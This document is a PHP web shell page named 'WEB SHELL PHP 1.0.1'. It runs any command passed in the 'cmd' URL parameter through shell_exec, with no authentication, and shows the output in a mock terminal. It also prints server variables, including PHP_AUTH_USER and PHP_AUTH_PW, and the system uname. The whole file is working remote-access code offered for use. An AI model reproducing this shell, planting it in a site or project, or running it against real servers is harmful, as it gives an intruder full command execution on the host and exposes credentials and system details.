<?php
session_start();
$version = "1.0.1";
$date = date("Y-m-d H:i:s");
$indicesServer = array('PHP_SELF',
'argv',
'argc',
'GATEWAY_INTERFACE',
'SERVER_ADDR',
'SERVER_NAME',
'SERVER_SOFTWARE',
'SERVER_PROTOCOL',
'REQUEST_METHOD',
'REQUEST_TIME',
'REQUEST_TIME_FLOAT',
'QUERY_STRING',
'DOCUMENT_ROOT',
'HTTP_ACCEPT',
'HTTP_ACCEPT_CHARSET',
'HTTP_ACCEPT_ENCODING',
'HTTP_ACCEPT_LANGUAGE',
'HTTP_CONNECTION',
'HTTP_HOST',
'HTTP_REFERER',
'HTTP_USER_AGENT',
'HTTPS',
'REMOTE_ADDR',
'REMOTE_HOST',
'REMOTE_PORT',
'REMOTE_USER',
'REDIRECT_REMOTE_USER',
'SCRIPT_FILENAME',
'SERVER_ADMIN',
'SERVER_PORT',
'SERVER_SIGNATURE',
'PATH_TRANSLATED',
'SCRIPT_NAME',
'REQUEST_URI',
'PHP_AUTH_DIGEST',
'PHP_AUTH_USER',
'PHP_AUTH_PW',
'AUTH_TYPE',
'PATH_INFO',
'ORIG_PATH_INFO') ;
if (empty($_GET['cmd'])) {

	if (PHP_OS === "Linux") {
		//echo "L'os est Linux";
		$cmd = "ls -la";
		$pwd = shell_exec("pwd");
	}else{
		//echo "L'os est Windows";
		$cmd = "dir";
		$pwd = shell_exec("cd");
	}
}else{

	if (PHP_OS === "Linux") {
		//echo "L'os est Linux";
		$cmd = $_GET['cmd'];
		$pwd = shell_exec("pwd");
	}else{
		//echo "L'os est Windows";
		$cmd = $_GET['dir'];
		$pwd = shell_exec("cd");
	}
}
if ($_GET['cmd'] === "color 1") {
	$_SESSION['color']= "#0080FF";
}else if ($_GET['cmd'] === "color 2") {
	$_SESSION['color'] = "#24B800";
}else if ($_GET['cmd'] === "color 3") {
	$_SESSION['color'] = "#2DECFF";
}else if ($_GET['cmd'] === "color 4") {
	$_SESSION['color'] = "#FF4C4C";
}else if ($_GET['cmd'] === "color 5") {
	$_SESSION['color'] = "#F14CFF";
}else if ($_GET['cmd'] === "color 6") {
	$_SESSION['color'] = "#F0EC20";
}else if ($_GET['cmd'] === "color 7") {
	$_SESSION['color'] = "#C2C2C2";
}else if ($_GET['cmd'] === "color 8") {
	$_SESSION['color'] = "#FFB200";
}else if ($_GET['cmd'] === "color 0") {
	$_SESSION['color'] = "White";
}
if ($_GET['cmd'] === "help") {
	$help = "help";
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>WEB SHELL PHP <?php echo $version;?></title>
</head>
<body>


<style type="text/css">
	
	body{
		margin: 0;
		padding: 0;
		overflow-x: hidden;
		background-color: #473A38;

	}

	header{
		width: 100%;
		height: 10vh;
		background-color: black;
		display: flex;
    	align-items: center;
    	justify-content: center;
	}

	header div{		
		
	}

	header div h1{
		color: white;
		font-family: sans-serif;
	}

	main{
		margin-top: 50px;
	}

	section{
		width: 80%;
		height: 700px;
		margin-right: auto;
		margin-left: auto;
	}

	textarea{
		width: 99%;
		text-align: left;
		height: 650px;
		text-align: left;

		max-width: 99%;
		min-width: 99%;

		max-height: 650px;
		min-height: 650px;

		background-color: black;
		color: <?php echo $_SESSION['color'];?>;

	}

	input{
		width: 99%;
		height: 50px;
		margin-top: -10px;
		background-color: black;
		color: white;
	}

	.info{
		margin-top: 50px;
		width: 80%;
		height: 1780px;
		border: 1px solid black;
		margin-bottom: 50px;
		background-color: black;
		color: white;
	}

	.uname{
		width: 80%;
		height: 55px;
		font-family: sans-serif;
		font-size: 20px;
		border: 1px solid black;
		margin-bottom: 100px;
		background-color: black;
		color: white;
		margin-left: auto;
		margin-right: auto;
		text-align: center;	
	}

</style>

<header>
	<div>
		<h1>Web Shell PHP - Caltus124 - Server OS:<?php echo " ".PHP_OS." ".$date; ?></h1>
	</div>
</header>

<main>
	<section>
		<?php
			$root = "root@shell$";
			$output = shell_exec($cmd);
		?>
		<textarea readonly>
 _       ____________  ______  _____ __  __________    __     __ __ 
| |     / / ____/ __ )/ ____ \/ ___// / / / ____/ /   / /  __/ // /_
| | /| / / __/ / __  / / __ `/\__ \/ /_/ / __/ / /   / /  /_  _  __/
| |/ |/ / /___/ /_/ / / /_/ /___/ / __  / /___/ /___/ /__/_  _  __/ 
|__/|__/_____/_____/\ \__,_//____/_/ /_/_____/_____/_____//_//_/    
                     \____/  
		<?php
		echo "\n";
		echo $root." ".$pwd;
		echo "# ".$cmd;
		echo "\n";
		echo $output;
		?>
		</textarea>
		<form method="GET" action="#">
			<input type="text" name="cmd" value="<?php echo $cmd;?>">					
		</form>
	</section>
	<section class="info">
		<?php 
			echo '<table border=1 cellpadding="10" style="color: white;   font-family: sans-serif; margin-left: auto; margin-right: auto; margin-top: 50px;">' ;
			foreach ($indicesServer as $arg) {
			    if (isset($_SERVER[$arg])) {
			        echo '<tr><td>'.$arg.'</td><td>' . $_SERVER[$arg] . '</td></tr>' ;
			    }
			    else {
			        echo '<tr><td>'.$arg.'</td><td>-</td></tr>' ;
			    }
			}
			echo '</table>' ;
		?>
	</section>
	<div class="uname">
		<p><?php echo php_uname(); ?></p>
	</div>
</main>
</body>
</html>
